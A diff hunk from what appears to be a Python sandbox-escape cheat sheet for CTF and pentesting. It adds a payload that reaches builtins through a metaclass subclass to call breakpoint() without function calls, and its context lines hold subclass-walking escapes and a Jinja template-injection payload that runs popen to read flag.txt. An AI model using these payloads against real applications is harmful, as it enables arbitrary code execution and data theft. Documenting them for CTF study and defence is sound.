@@ -496,6 +496,9 @@ defined_func.__class__.__base__.__subclasses__()
 "".__getattribute__("__class__").mro()[1].__subclasses__()
 "".__getattribute__("__class__").__base__.__subclasses__()
 
+# This can be useful in case it is not possible to make calls (therefore using decorators)
+().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec
+
 #If attr is present you can access everything as a string
 # This is common in Django (and Jinja) environments
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
